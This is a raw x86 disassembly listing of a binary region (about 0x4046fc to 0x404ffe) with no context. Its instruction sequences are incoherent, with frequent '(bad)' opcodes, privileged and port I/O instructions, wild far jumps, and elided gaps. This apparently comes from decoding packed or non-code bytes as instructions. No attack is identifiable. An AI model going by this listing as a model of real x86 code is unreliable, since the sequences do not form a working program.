  4046fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046fd:	adc    BYTE PTR [esi],cl
  4046ff:	adc    DWORD PTR cs:[ecx+0x6],edx
  404703:	cs inc ecx
  404705:	cwde   
  404706:	jmp    0xf262:0xa406a5
  40470d:	mov    ds:0x5ad3ed75,eax
  404712:	scas   eax,DWORD PTR es:[edi]
  404713:	jmp    0xedb5ea52
  404718:	xchg   edx,eax
  404719:	dec    eax
  40471a:	fcom   st(6)
  40471c:	call   0xcbf:0x432c377
  404723:	jmp    0x692cbe39
  404728:	icebp  
  404729:	xor    dh,bh
  40472b:	mov    dh,0x9a
  40472d:	jne    0x4046b4
  40472f:	cmp    ebx,ebx
  404731:	mov    ds:0x15d39ff,eax
  404736:	add    ecx,ebp
  404738:	cmp    bl,BYTE PTR [eax+0x355863]
  40473e:	leave  
  40473f:	stos   BYTE PTR es:[edi],al
	...
  404754:	push   eax
  404755:	ja     0x404743
  404757:	push   0x58
  404759:	clc    
  40475a:	push   esp
  40475c:	cmp    edi,DWORD PTR [edi+0x7d]
  40475f:	fnstcw WORD PTR [edx]
  404761:	sub    al,0x19
  404763:	outs   dx,BYTE PTR ds:[esi]
  404764:	push   eax
  404765:	or     al,0xff
  404767:	fadd   QWORD PTR [edx-0x68]
  40476a:	fiadd  DWORD PTR [ebx-0x66]
  40476d:	mov    ds:0xa26adcff,eax
  404772:	jne    0x404751
  404774:	fwait
  404775:	sub    eax,0xc7375108
  40477a:	(bad)  
  40477b:	ds je  0x40473c
  40477e:	adc    cl,ch
  404780:	add    DWORD PTR [edi-0x14],esi
  404783:	push   0x58
  404785:	clc    
  404786:	call   FWORD PTR [esi+ebp*1+0x3aed7d7e]
  40478d:	sub    al,0x16
  40478f:	push   ss
  404790:	inc    eax
  404791:	adc    bh,bh
  404793:	xchg   esp,eax
  404794:	inc    edx
  404795:	cwde   
  404796:	scas   al,BYTE PTR es:[edi]
  404797:	add    BYTE PTR [edx+0x5f],bl
  40479a:	(bad)  
  40479b:	dec    DWORD PTR [ebp+0x1875fef3]
  4047a1:	push   edi
  4047a2:	add    eax,0xc95de7db
  4047a7:	ret    0xfee4
  4047aa:	push   esp
  4047ab:	mov    esi,esp
  4047ad:	jns    0x404773
  4047af:	lock pop es
  4047b1:	or     BYTE PTR [eax+ebp*8],cl
  4047b4:	daa    
  4047b5:	pop    ebx
  4047b6:	(bad)  
  4047b7:	inc    DWORD PTR [eax]
	...
  4047c9:	add    BYTE PTR [eax],al
  4047cb:	add    BYTE PTR [ecx+0x38],cl
  4047ce:	or     al,0x83
  4047d0:	add    eax,0x1e740010
  4047d5:	pop    edi
  4047d6:	jne    0x4047e4
  4047d8:	js     0x40478b
  4047da:	loop   0x4047db
  4047dc:	xlat   BYTE PTR ds:[ebx]
  4047dd:	icebp  
  4047de:	mov    edi,0x45915274
  4047e3:	lock pusha 
  4047e5:	pop    edi
  4047e6:	jne    0x4047f4
  4047e8:	mov    eax,0xb7ffe37c
  4047ed:	icebp  
  4047ee:	mov    edi,0x7d7bc274
  4047f3:	cld    
  4047f4:	nop
  4047f5:	dec    BYTE PTR [edi]
  4047f7:	add    BYTE PTR [ebx-0x62],dh
  4047fa:	(bad)  
  4047fb:	jne    0x4047d1
  4047fd:	pop    ebp
  4047fe:	jne    0x4047f8
  404800:	or     BYTE PTR [eax-0xdf8001a],ch
  404806:	mov    edi,0x755d5175
  40480b:	adc    bh,dh
  40480d:	pop    es
  40480e:	cld    
  40480f:	dec    DWORD PTR [ebp+0x5875ff86]
  404815:	push   esi
  404816:	dec    edi
  404817:	jmp    DWORD PTR [edi+0x5e]
  40481a:	lea    eax,[ebp+0x50]
  40481d:	in     eax,dx
  40481e:	out    0xe0,eax
  404820:	xor    ebx,DWORD PTR [esi-0x1]
  404823:	(bad)  
  404824:	cmp    DWORD PTR [edi+ecx*1-0x5e2b1f18],eax
  40482b:	inc    DWORD PTR [eax]
  40482d:	(bad)  
  40482e:	push   cs
	...
  404843:	add    BYTE PTR [esi+ebp*1-0x51],ch
  404847:	xor    ebp,0xffffffa7
  40484a:	mov    eax,ds:0xb0ff4575
  40484f:	loop   0x40483f
  404851:	call   0xc1f:0x1635458b
  404858:	cmp    DWORD PTR [ebx+0x49],eax
  40485b:	dec    DWORD PTR [ebx+eax*8-0x55]
  40485f:	pop    edx
  404860:	fstp   TBYTE PTR [edx-0x1406f45f]
  404866:	aam    0x8c
  404868:	je     0x4048d1
  40486a:	xor    al,0xff
  40486c:	sub    al,0xc3
  40486e:	stos   DWORD PTR es:[edi],eax
  40486f:	adc    DWORD PTR [edx+0x790ba15a],ebx
  404875:	or     esp,ebp
  404877:	sbb    BYTE PTR [ebx+ecx*4],0x4
  40487b:	add    BYTE PTR [ecx],ch
  40487d:	xchg   edi,eax
  40487e:	adc    al,0x11
  404880:	mov    fs,WORD PTR [ebx+esi*8-0x5edcf302]
  404887:	jne    0x40480a
  404889:	sub    dl,BYTE PTR [edi]
  40488b:	or     BYTE PTR [ecx+0x24],ah
  40488e:	mov    ds:0x472c6eff,al
  404893:	lock or DWORD PTR [edi+0x22],ecx
  404897:	jecxz  0x4048f7
  404899:	dec    edx
  40489a:	mov    eax,ds:0x493f4575
  40489f:	fisttp QWORD PTR [esi+0x3a]
  4048a2:	retf   
  4048a3:	ret    0x9735
  4048a6:	mov    eax,DWORD PTR ss:[eax]
	...
  4048b9:	add    BYTE PTR [eax],al
  4048bb:	add    BYTE PTR [ebp+0x16],cl
  4048be:	enter  0x8af0,0xfe
  4048c2:	mov    esp,0xf100a4ff
  4048c7:	stos   DWORD PTR es:[edi],eax
  4048c8:	mov    al,0x9d
  4048ca:	push   ds
  4048cb:	mov    eax,ds:0x84e13ab0
  4048d0:	xchg   esp,eax
  4048d1:	clc    
  4048d2:	call   0x7ce1bfee
  4048d7:	or     edx,DWORD PTR [ecx]
  4048d9:	stos   DWORD PTR es:[edi],eax
  4048da:	or     BYTE PTR [ecx+0x1828f4fe],ah
  4048e0:	sub    esi,DWORD PTR [ebx-0x5c]
  4048e3:	xchg   ebx,eax
  4048e4:	mov    DWORD PTR [ecx+0x53d10c5c],esp
  4048ea:	retf   
  4048eb:	mov    al,ds:0x17a8f4de
  4048f0:	sbb    edi,DWORD PTR [edi+0x4c]
  4048f3:	mov    al,ds:0x3d90039
  4048f8:	dec    edx
  4048f9:	adc    BYTE PTR [esi+0x3ca0bd16],bh
  4048ff:	pushf  
  404900:	mov    eax,ds:0xaea0c6e0
  404905:	hlt    
  404906:	test   al,0x17
  404908:	cmp    BYTE PTR ds:0x4fa9466c,bh
  40490e:	cmp    ebp,0xa08ea09b
  404914:	add    al,0xf8
  404916:	nop
  404917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404918:	mov    al,gs:0x447a8c7e
  40491e:	mov    al,ds:0xc5
	...
  404933:	add    BYTE PTR ds:0x5d8d1400,bh
  404939:	jle    0x404968
  40493b:	push   edi
  40493c:	addr16 mov al,ds:0xc85e
  404940:	mov    ah,0x67
  404942:	push   edi
  404943:	mov    al,ds:0x3e8ff56
  404948:	cmp    DWORD PTR [ebp-0x54],esi
  40494b:	rdmsr  
  40494d:	shl    BYTE PTR [ebp-0x1846fa],0xe8
  404954:	dec    edi
  404955:	add    eax,0x3bb1e9
  40495a:	add    BYTE PTR [esi],ah
  40495c:	dec    edi
  40495d:	or     al,0xe8
  40495f:	dec    eax
  404960:	rcr    DWORD PTR [edi+0x15fae2ff],1
  404966:	jno    0xe981363d
  40496c:	fst    DWORD PTR ds:0xc018110c
  404972:	push   esi
  404974:	mov    ds:0xde0d680d,al
  404979:	inc    eax
  40497a:	add    dh,ah
  40497c:	inc    eax
  40497d:	or     al,0xe8
  40497f:	push   cs
  404980:	xchg   ebp,eax
  404981:	lahf   
  404982:	jmp    DWORD PTR [eax-0x40]
  404985:	pop    eax
  404986:	dec    dh
  404988:	scas   al,BYTE PTR es:[edi]
  404989:	sub    BYTE PTR [esi],bh
  40498b:	call   0x64cd49ca
  404990:	sti    
  404991:	sahf   
  404992:	push   DWORD PTR [esi-0x72585793]
	...
  4049ac:	into   
  4049ad:	lahf   
  4049ae:	lea    ebp,[ebx+edi*2-0x62]
  4049b2:	call   FWORD PTR [esi+0x51b59f65]
  4049b8:	mov    bh,0x9f
  4049ba:	inc    DWORD PTR [ecx-0x16ff9226]
  4049c0:	mov    ch,0x85
  4049c2:	mov    esp,0x409f9e7f
  4049c7:	out    0xbe,al
  4049c9:	cli    
  4049ca:	add    cl,ch
  4049cc:	cmp    cl,BYTE PTR [ebp-0x6038d46b]
  4049d2:	call   DWORD PTR [esi+0x3b]
  4049d5:	lock (bad) 
  4049d7:	call   0x6ac45916
  4049dc:	xor    eax,0xcd000000
  4049e1:	inc    ecx
  4049e2:	sub    al,0x50
  4049e4:	push   0x20412c51
  4049e9:	imul   edi,DWORD PTR [ebp+ebp*4-0x3ff4fce0],0xffffffc5
  4049f1:	pop    es
  4049f2:	jmp    0x435ac3
  4049f7:	lea    edx,[ebp+0x3ffffec2]
  4049fd:	jno    0x404a41
  4049ff:	sub    al,0xa0
  404a01:	jmp    0x9fe8:0x2d12cd3
  404a08:	jge    0x404a0e
  404a0a:	add    BYTE PTR [ebx],cl
  404a0c:	and    cl,bh
  404a0e:	add    al,0xe9
	...
  404a24:	iret   
  404a25:	add    al,BYTE PTR [eax]
  404a27:	add    bh,bh
  404a29:	test   DWORD PTR [ebx],0xff64ede8
  404a2f:	(bad)  
  404a30:	fcmovnb st,st(2)
  404a32:	jne    0x404a43
  404a34:	push   0xd0412866
  404a39:	jge    0x404ab0
  404a3b:	or     al,0x78
  404a3d:	sbb    bh,bl
  404a3f:	(bad)  
  404a40:	fild   QWORD PTR [ecx+0xa]
  404a43:	push   0xffffff90
  404a45:	jge    0x404abc
  404a47:	or     al,0xc8
  404a49:	mov    edi,ds
  404a4b:	jmp    FWORD PTR [edi-0x413d6a91]
  404a51:	jge    0x404a52
  404a53:	lea    esp,[edx]
  404a55:	nop
  404a56:	push   ecx
  404a57:	push   eax
  404a58:	test   al,0x50
  404a5a:	(bad)  
  404a5c:	out    dx,eax
  404a5d:	sar    dh,cl
  404a5f:	jne    0x4049e9
  404a61:	jge    0x404ad8
  404a63:	adc    al,0xdf
  404a65:	test   DWORD PTR [edi],0x7f7ff50
  404a6b:	call   0xffdd83a9
  404a70:	dec    esi
  404a71:	inc    eax
  404a72:	(bad)  
  404a73:	fild   DWORD PTR [esi+0x45]
  404a76:	stos   BYTE PTR es:[edi],al
  404a77:	pusha  
  404a78:	lods   al,BYTE PTR ds:[esi]
  404a79:	push   0xffffffef
  404a7b:	mov    BYTE PTR [ebx+ebx*1+0x2b2eff9d],bh
  404a82:	and    BYTE PTR [eax],dl
  404a84:	cmp    DWORD PTR [ecx+eax*1-0x15],edi
	...
  404a9c:	dec    ebx
  404a9d:	(bad)  
  404a9e:	pop    ss
  404a9f:	adc    BYTE PTR [esi],dl
  404aa1:	cmp    eax,0xf0efe57
  404aa6:	stos   DWORD PTR es:[edi],eax
  404aa7:	inc    edx
  404aa8:	xlat   BYTE PTR ds:[ebx]
  404aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aaa:	add    ecx,DWORD PTR [ebx]
  404aac:	stc    
  404aad:	adc    esp,eax
  404aaf:	fistp  QWORD PTR [bx+0x44]
  404ab4:	out    dx,al
  404ab5:	adc    al,0xf
  404ab7:	call   0xffde10e9
  404abc:	fidiv  WORD PTR [eax+ebx*2-0x2]
  404ac0:	(bad)  
  404ac1:	mov    dh,0x34
  404ac3:	call   0xffddb915
  404ac8:	imul   ebp,DWORD PTR [edx],0xd339181f
  404ace:	ud0    ebp,DWORD PTR [ebx+edi*4]
  404ad2:	xor    edi,edi
  404ad4:	and    al,0x9f
  404ad6:	pushf  
  404ad7:	push   ebp
  404ad8:	inc    ecx
  404ad9:	jb     0x404aeb
  404adb:	jmp    DWORD PTR [ebx+edx*4]
  404ade:	xor    edi,edi
  404ae0:	or     al,0x9f
  404ae2:	stos   DWORD PTR es:[edi],eax
  404ae3:	push   esp
  404ae4:	mov    WORD PTR [esi+0x621ce89d],cs
  404aea:	popf   
  404aeb:	jmp    FWORD PTR [esp+0x1676fec2]
  404af2:	xor    al,0xff
  404af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404af5:	jmp    0x404a94
  404af7:	jmp    DWORD PTR [esi+0x0]
  404afa:	push   ecx
  404afb:	mov    ecx,0x86e9008d
	...
  404b14:	jns    0x404b23
  404b16:	ins    BYTE PTR es:[edi],dx
  404b17:	xchg   ebx,eax
  404b18:	dec    edi
  404b19:	popf   
  404b1a:	dec    esi
  404b1b:	popf   
  404b1c:	mov    WORD PTR [edi+eax*2-0x63],ds
  404b20:	ds test al,0x2f
  404b23:	jo     0x404b5e
  404b25:	add    BYTE PTR [esi],dh
  404b27:	push   edi
  404b28:	icebp  
  404b29:	popf   
  404b2a:	cs popf 
  404b2c:	adc    ebx,edx
  404b2e:	inc    ecx
  404b2f:	popf   
  404b30:	push   ds
  404b31:	(bad)  
  404b32:	sub    edi,eax
  404b34:	push   ss
  404b35:	xor    al,0x62
  404b37:	mov    al,0xa3
  404b39:	add    BYTE PTR [esi],cl
  404b3b:	pop    ss
  404b3c:	sub    eax,0xfff37c9d
  404b41:	adc    ch,ch
  404b43:	pushf  
  404b44:	ins    BYTE PTR es:[edi],dx
  404b45:	or     BYTE PTR [ecx],al
  404b47:	fucomp st(4)
  404b49:	pushf  
  404b4a:	out    dx,al
  404b4b:	retf   0xeffb
  404b4e:	call   0xdeebfd89
  404b53:	push   ss
  404b54:	inc    ebp
  404b55:	test   al,0x32
  404b57:	mov    ebp,0xc3e29cce
  404b5c:	dec    ebp
  404b5d:	inc    ch
  404b5f:	push   ss
  404b60:	sub    DWORD PTR [eax],esi
  404b62:	rcl    DWORD PTR [ecx+0x33b69c97],1
  404b68:	scas   al,BYTE PTR es:[edi]
  404b69:	adc    dl,cl
  404b6b:	pushf  
  404b6c:	sub    al,0xf4
  404b6e:	cmp    BYTE PTR [ebp+0x5d910824],bl
  404b74:	xchg   esi,eax
  404b75:	pushf  
  404b76:	xchg   esi,eax
  404b77:	stos   DWORD PTR es:[edi],eax
	...
  404b8c:	mov    ds:0x709c8eb9,eax
  404b91:	rcr    ebp,0x3
  404b94:	in     al,0x88
  404b96:	lea    ebx,[esp+ebp*8+0x4775fff3]
  404b9d:	lock (bad) 
  404b9f:	hlt    
  404ba0:	sub    bl,BYTE PTR ss:[edx]
  404ba3:	inc    di
  404ba5:	or     al,ch
  404ba7:	mov    al,ds:0x56ff9cb5
  404bac:	daa    
  404bad:	hlt    
  404bae:	(bad)  
  404baf:	aam    0x4a
  404bb1:	popf   
  404bb2:	jne    0x404ba9
  404bb4:	adc    cl,ah
  404bb6:	(bad)  
  404bb7:	mov    ah,0x42
  404bb9:	test   al,0xa6
  404bbb:	ss int 0x9b
  404bbe:	push   DWORD PTR [esi+ebp*1-0x42068a65]
  404bc5:	adc    eax,0x9b16930c
  404bca:	jne    0x404bad
  404bcc:	loop   0x404c3d
  404bce:	dec    DWORD PTR [esi]
  404bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd1:	leave  
  404bd2:	ret    0x3ad9
  404bd5:	xor    eax,0xc4b90d8b
  404bda:	lock call 0x45b1:0x122b3324
  404be2:	or     al,0xe6
  404be4:	add    eax,0xb2e1458b
  404be9:	adc    eax,0x9c786608
  404bee:	(bad)  
  404bef:	and    al,0x0
	...
  404c01:	add    BYTE PTR [eax],al
  404c03:	add    BYTE PTR [ecx+0x3ae90000],ch
  404c09:	jg     0x404c48
  404c0b:	push   ss
  404c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0d:	inc    eax
  404c0e:	add    cl,ch
  404c10:	ds cmp al,0x83
  404c13:	sub    al,0x35
  404c15:	add    BYTE PTR [edi+edi*1-0x50],dh
  404c19:	inc    ebp
  404c1a:	lock cmp DWORD PTR [edi+0x1],esp
  404c1e:	push   0xffffffe9
  404c20:	pop    esp
  404c21:	add    BYTE PTR [ebx+0x739b8d0c],al
  404c27:	add    BYTE PTR [ebp-0x34ef8a8a],cl
  404c2d:	add    ch,BYTE PTR [edx+0x0]
  404c30:	cmp    al,BYTE PTR [ecx*4-0x12c17bb]
  404c37:	adc    eax,0x40ac9f
  404c3c:	dec    ebx
  404c3d:	mov    edi,0xf8e32f74
  404c42:	repz add BYTE PTR [esp+ebp*4-0x76],ch
  404c47:	inc    ebp
  404c48:	inc    esp
  404c49:	mov    cl,BYTE PTR [ebp-0x10]
  404c4c:	cmp    ecx,DWORD PTR [edi+esi*2]
  404c4f:	pop    ss
  404c50:	jecxz  0x404cc4
  404c52:	mov    esi,DWORD PTR [ebp+0x6c]
  404c55:	mov    edi,DWORD PTR [ebp+0x8]
  404c58:	stos   DWORD PTR es:[edi],eax
  404c59:	dec    ecx
  404c5a:	lock jecxz 0x404c7f
  404c5d:	jb     0x404c03
  404c5f:	mov    ebx,ebp
  404c61:	add    bh,bh
  404c63:	jne    0x404c85
  404c65:	xchg   DWORD PTR [eax],eax
  404c67:	inc    DWORD PTR [eax]
	...
  404c79:	add    BYTE PTR [eax],al
  404c7b:	add    BYTE PTR [ebp-0x75],bh
  404c7e:	call   0x44d7ba
  404c83:	mov    esp,DWORD PTR [ebx]
  404c85:	xlat   BYTE PTR ds:[ebx]
  404c86:	pop    ebp
  404c87:	pop    ebx
  404c88:	sbb    edx,eax
  404c8a:	or     al,0x0
  404c8c:	sbb    eax,0x9c83ec8b
  404c91:	jb     0x404ce6
  404c93:	push   esi
  404c94:	paddsb mm6,QWORD PTR [esi+0x2f]
  404c98:	adc    DWORD PTR [eax+ebp*8],eax
  404c9b:	cdq    
  404c9c:	stos   DWORD PTR es:[edi],eax
  404c9d:	(bad)  
  404c9e:	dec    DWORD PTR [edx-0x3ba4228]
  404ca4:	mov    al,ds:0x9bfffffe
  404ca9:	mov    esi,0xe3483e74
  404cae:	cs inc ecx
  404cb0:	mov    al,ds:0x3945e7d1
  404cb5:	add    eax,DWORD PTR ds:[eax]
  404cb8:	xor    ch,BYTE PTR [ecx+0xf]
  404cbb:	das    
  404cbc:	mov    dl,0x18
  404cbe:	sub    eax,DWORD PTR [esi+eiz*1+0x615303e8]
  404cc5:	pop    esp
  404cc6:	outs   dx,BYTE PTR ds:[esi]
  404cc7:	add    BYTE PTR [ecx],bh
  404cc9:	sahf   
  404cca:	ret    
  404ccb:	je     0x404d0c
  404ccd:	push   cs
  404cce:	fwait
  404ccf:	(bad)  
  404cd0:	cld    
  404cd1:	cmp    al,0x33
  404cd3:	call   0x43cae4
  404cd8:	jmp    0xbcc3ff26
  404cdd:	inc    esp
  404cde:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  404cf2:	add    BYTE PTR [eax],al
  404cf4:	inc    ebx
  404cf5:	jg     0x404cfb
  404cf7:	add    BYTE PTR [ecx],bh
  404cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cfa:	cmp    bl,BYTE PTR [esi-0x7e]
  404cfd:	loopne 0x404cc4
  404cff:	mov    eax,0x3a739
  404d04:	jbe    0x404d5f
  404d06:	ds leave 
  404d08:	cli    
  404d09:	pop    esp
  404d0a:	mov    gs,esp
  404d0c:	mov    edx,0x3c8392e3
  404d11:	cli    
  404d12:	call   0xfe78657
  404d17:	adc    bh,BYTE PTR [edx+0x782ebe54]
  404d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1e:	add    esi,DWORD PTR [eax+esi*1+0x26]
  404d22:	xlat   BYTE PTR ds:[ebx]
  404d23:	fisub  WORD PTR [edi]
  404d25:	call   0xaa844d2d
  404d2a:	pop    ebx
  404d2b:	add    DWORD PTR [ecx],edi
  404d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d2e:	add    ecx,ecx
  404d30:	cli    
  404d31:	adc    al,0x3f
  404d33:	cli    
  404d34:	jg     0x404cdd
  404d36:	add    eax,esi
  404d38:	stc    
  404d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d3a:	add    eax,esi
  404d3c:	stc    
  404d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d3e:	add    eax,esi
  404d40:	stc    
  404d41:	(bad)  
  404d42:	jmp    0xe580cc4a
  404d47:	add    esi,DWORD PTR [edi+0x40]
  404d4a:	in     al,dx
  404d4b:	(bad)  
  404d4c:	mov    ch,0x43
  404d4e:	xchg   ebp,eax
  404d4f:	xor    al,0x13
  404d51:	add    BYTE PTR [ebx],dl
  404d53:	add    al,0xe3
  404d55:	call   DWORD PTR [edx]
  404d57:	add    al,0x0
	...
  404d69:	add    BYTE PTR [eax],al
  404d6b:	add    bl,ah
  404d6d:	inc    DWORD PTR [edx]
  404d6f:	add    al,0xd1
  404d71:	fucomip st,st(2)
  404d73:	add    edi,DWORD PTR [ecx]
  404d75:	or     DWORD PTR es:[esi],ebp
  404d78:	cmp    ecx,DWORD PTR [ebx-0x6716625c]
  404d7e:	cld    
  404d7f:	mov    al,0x17
  404d81:	aas    
  404d82:	jmp    0xeb53c693
  404d87:	retf   0xc0fa
  404d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d8b:	xchg   ebx,eax
  404d8c:	cmp    DWORD PTR [eax],eax
  404d8e:	jmp    0x39830196
  404d93:	xor    al,0x1e
  404d95:	adc    ebx,DWORD PTR ds:0xf499392e
  404d9b:	mov    esp,0xce93f5f
  404da0:	stc    
  404da1:	adc    ah,dh
  404da3:	shl    BYTE PTR [eax+edx*4-0x17],0x3
  404da8:	cmp    DWORD PTR [eax],eax
  404daa:	dec    BYTE PTR [esi]
  404dac:	in     eax,0x98
  404dae:	fdivr  QWORD PTR [eax-0x7316c0e9]
  404db4:	je     0x404d46
  404db6:	mov    al,0xc4
  404db8:	ins    BYTE PTR es:[edi],dx
  404db9:	test   ebp,ecx
  404dbb:	test   ch,dh
  404dbd:	xchg   DWORD PTR [esi+edi*1-0x4f],esp
  404dc1:	das    
  404dc2:	inc    ecx
  404dc3:	in     eax,dx
  404dc4:	(bad)  
  404dc6:	jmp    0xbee24676
  404dcb:	cwde   
  404dcc:	or     DWORD PTR ds:0xa900,eax
	...
  404de2:	add    BYTE PTR [eax],al
  404de4:	add    al,BYTE PTR ss:[ebx+0x76f3ad2c]
  404deb:	adc    bh,BYTE PTR [esi-0x22c60fbe]
  404df1:	stc    
  404df2:	stos   BYTE PTR es:[edi],al
  404df3:	jmp    0x1200d132
  404df8:	inc    ebx
  404df9:	or     DWORD PTR [esi+0xf2fd02c],esi
  404dff:	aaa    
  404e00:	das    
  404e01:	call   0x19fd:0x4308e650
  404e08:	xor    BYTE PTR [edx+0x45],dl
  404e0b:	or     cl,BYTE PTR gs:[ecx]
  404e0e:	mov    dh,0xa4
  404e10:	lods   eax,DWORD PTR ds:[esi]
  404e11:	das    
  404e12:	setg   BYTE PTR [edi]
  404e15:	xchg   esi,eax
  404e16:	push   eax
  404e17:	fsubp  st(0),st
  404e19:	inc    edx
  404e1a:	stc    
  404e1b:	cdq    
  404e1c:	inc    ecx
  404e1d:	dec    esi
  404e1e:	inc    ebp
  404e1f:	inc    ecx
  404e20:	push   0x7
  404e22:	mov    bh,0xac
  404e24:	enter  0xf30,0x76
  404e28:	pop    edi
  404e29:	mov    WORD PTR [eax+0x26],ss
  404e2c:	inc    edi
  404e2d:	nop
  404e2e:	push   0x4121d9
  404e33:	fs inc edi
  404e35:	test   BYTE PTR [eax+0x1],dl
  404e38:	shr    DWORD PTR [edx+0x0],1
  404e3b:	jmp    0x6c750afd
  404e40:	das    
  404e41:	test   BYTE PTR [eax+0x1],dl
  404e44:	popa   
  404e45:	imul   eax,DWORD PTR [eax],0xe9
	...
  404e5b:	add    BYTE PTR [edx],ch
  404e5d:	test   DWORD PTR [ebp+0x75],eax
  404e60:	or     eax,0x740e2b28
  404e65:	add    al,ch
  404e67:	cwde   
  404e68:	cdq    
  404e69:	xchg   edi,eax
  404e6a:	inc    ecx
  404e6c:	ds mov eax,0xc57f00ff
  404e72:	ret    
  404e73:	push   ebp
  404e74:	sub    ebp,DWORD PTR [eax-0x7f]
  404e77:	les    edi,FWORD PTR [edi+ebp*2]
  404e7a:	(bad)  
  404e7b:	inc    DWORD PTR [ebx-0x19]
  404e7e:	imul   eax,DWORD PTR [eax],0x75fefc2a
  404e84:	mov    BYTE PTR [ebx-0x5a],ch
  404e87:	aad    0xaf
  404e89:	outs   dx,DWORD PTR ds:[esi]
  404e8a:	mov    DWORD PTR [ebp-0x54],eax
  404e8d:	in     al,0x0
  404e8f:	add    bh,cl
  404e91:	push   DWORD PTR cs:[ebp+0x68]
  404e95:	imul   esp,edi,0xffffffd4
  404e98:	out    dx,eax
  404e99:	outs   dx,BYTE PTR ds:[esi]
  404e9a:	push   0x3509c
  404e9f:	(bad)  
  404ea0:	in     eax,0xdb
  404ea2:	(bad)  
  404ea3:	(bad)  
  404ea4:	out    dx,eax
  404ea5:	retf   
  404ea6:	out    0x7b,eax
  404ea8:	or     BYTE PTR [edi-0x1],ch
  404eab:	(bad)  
  404eac:	aad    0xdb
  404eae:	(bad)  
  404eaf:	(bad)  
  404eb0:	jg     0x404eca
  404eb2:	add    BYTE PTR [eax],al
  404eb4:	and    BYTE PTR [eax+0x6f6f6085],cl
  404eba:	call   DWORD PTR [eax+0x78]
  404ebd:	dec    ebp
  404ebe:	test   eax,0x0
	...
  404ed3:	add    BYTE PTR [eax],ah
  404ed5:	stos   BYTE PTR es:[edi],al
  404ed6:	enter  0x522b,0x89
  404eda:	mov    ebp,0xff6f2f74
  404edf:	jmp    0x404ee4
  404ee1:	cmp    DWORD PTR [edi],0x0
  404ee4:	jne    0x404ee6
  404ee6:	mov    edx,0x2e001
  404eeb:	or     eax,DWORD PTR [edx-0x10]
  404eee:	add    al,dh
  404ef0:	xlat   BYTE PTR ds:[ebx]
  404ef1:	add    al,BYTE PTR [edi+0x41]
  404ef4:	popa   
  404ef5:	je     0x404e77
  404ef7:	add    al,ah
  404ef9:	add    dh,BYTE PTR [edx-0x1b]
  404efc:	cmp    DWORD PTR [edx+0x412774c3],esp
  404f02:	js     0x404f04
  404f04:	cmp    DWORD PTR [ecx+0x56198588],ebp
  404f0a:	xchg   esi,eax
  404f0b:	dec    DWORD PTR [ecx]
  404f0d:	dec    esi
  404f0e:	adc    BYTE PTR [eax],cl
  404f10:	xchg   ecx,eax
  404f11:	or     eax,0x7196ffaf
  404f16:	pop    es
  404f17:	push   0x39
  404f19:	repz add edi,edi
  404f1c:	or     al,0xa1
  404f1e:	stos   DWORD PTR es:[edi],eax
  404f1f:	test   eax,0xe8968565
  404f24:	test   BYTE PTR [ebx-0x6a],bh
  404f27:	dec    DWORD PTR [ecx]
  404f29:	push   ss
  404f2a:	adc    BYTE PTR [eax],cl
  404f2c:	push   ecx
  404f2d:	add    esi,DWORD PTR [eax+0x4005eff]
  404f33:	add    al,0x39
  404f35:	test   eax,0xe9ab
	...
  404f4a:	add    BYTE PTR [eax],al
  404f4c:	xor    ax,0x8996
  404f50:	mov    esp,0x3eff964c
  404f55:	rcl    BYTE PTR [esi-0x6958c6fd],0xb5
  404f5c:	(bad)  
  404f5d:	(bad)  
  404f5e:	xchg   ebp,eax
  404f5f:	call   DWORD PTR [ecx+0x1efff3a9]
  404f65:	rol    BYTE PTR [ebx],0x4
  404f68:	cmp    DWORD PTR [edi-0x581fad55],esp
  404f6e:	add    edx,DWORD PTR [eax+0x6]
  404f71:	xor    eax,0x6feff37
  404f76:	xchg   esi,eax
  404f77:	jne    0x404fba
  404f79:	out    dx,eax
  404f7a:	and    ah,dl
  404f7c:	out    dx,al
  404f7d:	xchg   esi,eax
  404f7e:	sub    bh,bh
  404f80:	cmp    ah,BYTE PTR [edi-0x7c5b00fd]
  404f86:	xchg   esi,eax
  404f87:	call   esi
  404f89:	add    BYTE PTR [ecx+0x3],dl
  404f8c:	sub    DWORD PTR [eax],eax
  404f8e:	jmp    0xe93c88be
  404f93:	add    edx,ecx
  404f95:	out    0x7f,eax
  404f97:	add    al,0x39
  404f99:	xor    dh,al
  404f9b:	dec    edi
  404f9c:	or     eax,0xa695be95
  404fa1:	or     esp,ecx
  404fa3:	stos   DWORD PTR es:[edi],eax
  404fa4:	pusha  
  404fa5:	lods   al,BYTE PTR ds:[esi]
  404fa6:	scas   al,BYTE PTR es:[edi]
  404fa7:	xchg   ebp,eax
  404fa8:	mov    eax,ds:0x8e95a4bb
  404fad:	xor    BYTE PTR [esi+0xf],bl
	...
  404fc3:	add    BYTE PTR [ecx],dh
  404fc5:	test   al,0x9c
  404fc7:	mov    cl,0x7e
  404fc9:	xchg   ebp,eax
  404fca:	xor    DWORD PTR [ebx],0x87869577
  404fd0:	mov    ah,0x38
  404fd2:	jle    0x404f69
  404fd4:	data16 xor BYTE PTR [ecx],al
  404fd7:	jmp    0xac298eeb
  404fdc:	lods   al,BYTE PTR ds:[esi]
  404fdd:	pushf  
  404fde:	xchg   bp,ax
  404fe0:	sar    BYTE PTR [ebx-0x4b],0x94
  404fe4:	inc    esi
  404fe5:	xchg   ebp,eax
  404fe6:	push   0x57
  404fe8:	in     eax,0x94
  404fea:	dec    esi
  404feb:	xchg   ebp,eax
  404fec:	cmp    DWORD PTR [esp+ebp*4],ecx
  404fef:	sub    ah,0x37
  404ff2:	ds xchg ebp,eax
  404ff4:	es in  al,dx
  404ff6:	mov    edx,0x917abbd7
  404ffb:	xchg   esp,eax
  404ffc:	push   ss
  404ffd:	xchg   ebp,eax
  404ffe:	in     eax,dx
